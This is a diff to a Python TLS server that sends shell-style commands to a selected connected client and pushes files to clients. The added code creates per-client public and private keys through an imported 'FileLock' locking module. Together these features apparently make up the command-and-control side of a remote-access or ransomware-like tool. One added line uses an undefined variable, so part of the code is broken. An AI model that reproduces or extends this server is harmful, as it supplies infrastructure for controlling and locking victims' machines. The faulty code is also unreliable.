@@ -1,6 +1,9 @@
 import socket
 import ssl
 import threading
+import os
+import shutil
+from locking_mechanism import FileLock
 
 
 class ClientHandler(threading.Thread):
@@ -39,19 +42,18 @@ class ClientHandler(threading.Thread):
             print(f"[+] Connection closed for {self.client_address}")
 
 
+
 class TCPServer:
-    def __init__(self, host, port, max_clients=5, certfile='../ssl_deets/server.crt', keyfile='../ssl_deets/server.key'):
+    def __init__(self, host=None, port=None, certfile='../ssl_deets/server.crt', keyfile='../ssl_deets/server.key'):
         """
         Initializes the TCP server with SSL encryption.
         """
-        if certfile is None:
-            host = "0.0.0.0"
-        if port is None:
-            port = 8000
 
-        self.host = host
-        self.port = port
-        self.max_clients = max_clients
+        self.host = host if host is not None else "0.0.0.0"
+        self.port = port if port is not None else 8000
+
+        self.max_clients = 10
+        self.client_keys = {}
         self.clients = {}  # Dictionary to store active client connections
         self.current_client = None  # Stores the currently selected client for communication
 
@@ -61,7 +63,11 @@ class TCPServer:
         self.server_socket.listen(self.max_clients)
 
         # Wrap the socket with SSL for secure communication
-        self.server_socket = ssl.wrap_socket(self.server_socket, certfile=certfile, keyfile=keyfile, server_side=True)
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_cert_chain(certfile=certfile, keyfile=keyfile)
+
+        # Wrap the socket with SSL for secure communication
+        self.server_socket = context.wrap_socket(self.server_socket, server_side=True)
 
         print(f"[*] Secure server started on {self.host}:{self.port}")
 
@@ -97,6 +103,7 @@ class TCPServer:
         if self.current_client:
             try:
                 self.current_client.sendall(command.encode('utf-8'))
+                self.current_client.recv(4096)
             except Exception as e:
                 print(f"[!] Error sending command: {e}")
         else:
@@ -106,11 +113,21 @@ class TCPServer:
         """
         Starts the server to accept and handle client connections.
         """
+        if not os.path.exists('keys'):
+            os.makedirs('keys')
+            print("[+] 'keys' storage created.")
+        else:
+            print("[+] 'keys' director already exists.")
         try:
             while True:
                 # Accept a new client connection
                 client_socket, client_address = self.server_socket.accept()
-
+                #create public and private key for the client and store its location
+                identifier = str(client_address)
+                locker = FileLock(identifier)
+                locker.create_pub_key()
+                locker.create_priv_key()
+                self.client_keys[identifier] = f"{keys}/{identifier}"
                 # Create a new thread for the client
                 client_handler = ClientHandler(client_socket, client_address, self)
                 client_handler.start()
@@ -118,7 +135,53 @@ class TCPServer:
             print("\n[!] Server shutting down...")
         finally:
             # Close the server socket before shutting down
+            if os.path.exists('keys'):
+                shutil.rmtree('keys')
+                print("[+] 'keys' store removed.")
             self.server_socket.close()
             print("[*] Secure server closed")
 
+    def stop(self):
+        """
+        Stops the server abruptly by closing the server socket and all client connections.
+        """
+        print("[!] Stopping server abruptly...")
 
+        # Check if there are active client connections
+        if len(self.clients) > 0:
+            for address, client_socket in self.clients.items():
+                try:
+                    client_socket.close()
+                    print(f"[+] Connection closed for {address}")
+                except Exception as e:
+                    print(f"[!] Error closing connection for {address}: {e}")
+        # Clear the clients dictionary
+        self.clients.clear()
+
+        # Close the server socket
+        try:
+            shutil.rmtree('keys')
+            self.server_socket.close()
+            print("[*] Server socket closed")
+        except Exception as e:
+            print(f"[!] Error closing server socket: {e}")
+
+        print("[*] Server stopped abruptly")
+
+
+    def send_file(self, filename, client_address):
+        """
+        Sends a file to the specified client.
+        """
+        if client_address not in self.clients:
+            print(f"[!] Client {client_address} not found")
+            return
+
+        client_socket = self.clients[client_address]
+        try:
+            with open(filename, 'rb') as file:
+                while chunk := file.read(1024):
+                    client_socket.sendall(chunk)
+            print(f"[+] File '{filename}' sent to {client_address}")
+        except Exception as e:
+            print(f"[!] Error sending file: {e}")
